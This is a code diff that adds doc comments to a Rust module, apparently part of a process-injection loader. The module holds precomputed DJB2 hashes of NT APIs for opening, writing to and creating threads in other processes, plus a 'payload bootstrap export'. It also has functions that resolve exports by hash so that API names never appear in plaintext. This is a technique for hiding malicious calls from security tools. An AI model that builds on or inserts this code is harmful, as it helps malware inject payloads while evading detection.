@@ -1,16 +1,27 @@
 //! DJB2 hash for export-name matching without plaintext API strings.
 
+/// Precomputed DJB2 hash for `NtOpenProcess`.
 pub const H_NT_OPEN_PROCESS: u32 = 0x5003_C058;
+/// Precomputed DJB2 hash for `NtAllocateVirtualMemory`.
 pub const H_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x6793_C34C;
+/// Precomputed DJB2 hash for `NtWriteVirtualMemory`.
 pub const H_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95F3_A792;
+/// Precomputed DJB2 hash for `NtCreateThreadEx`.
 pub const H_NT_CREATE_THREAD_EX: u32 = 0xCB0C_2130;
+/// Precomputed DJB2 hash for `NtReadVirtualMemory`.
 pub const H_NT_READ_VIRTUAL_MEMORY: u32 = 0xC240_62E3;
+/// Precomputed DJB2 hash for `NtProtectVirtualMemory`.
 pub const H_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x0829_62C8;
+/// Precomputed DJB2 hash for `NtClose`.
 pub const H_NT_CLOSE: u32 = 0x8B8E_133D;
+/// Precomputed DJB2 hash for `NtSetInformationThread`.
 pub const H_NT_SET_INFORMATION_THREAD: u32 = 0x5421_2E31;
+/// Precomputed DJB2 hash for `NtQueryInformationProcess`.
 pub const H_NT_QUERY_INFORMATION_PROCESS: u32 = 0xD034_FC62;
+/// Precomputed DJB2 hash for the payload bootstrap export.
 pub const H_BOOTSTRAP: u32 = 0xE236_4AE3;
 
+/// Computes a DJB2 hash for a null-terminated export name slice.
 pub fn hash_cstr(name: &[u8]) -> u32 {
     let end = name.iter().position(|&b| b == 0).unwrap_or(name.len());
     let mut h: u32 = 5381;
@@ -35,6 +46,7 @@ struct ImageExportDirectory {
     address_of_name_ordinals: u32,
 }
 
+/// Resolves an export address in a loaded module by DJB2 hash.
 pub unsafe fn export_by_hash(module_base: *const u8, target_hash: u32) -> Option<*const u8> {
     if module_base.is_null() {
         return None;
@@ -79,6 +91,7 @@ pub unsafe fn export_by_hash(module_base: *const u8, target_hash: u32) -> Option
     None
 }
 
+/// Resolves an export RVA inside a PE image buffer by DJB2 hash.
 pub unsafe fn export_rva_by_hash(pe: &[u8], target_hash: u32) -> Option<u32> {
     if pe.len() < 64 {
         return None;
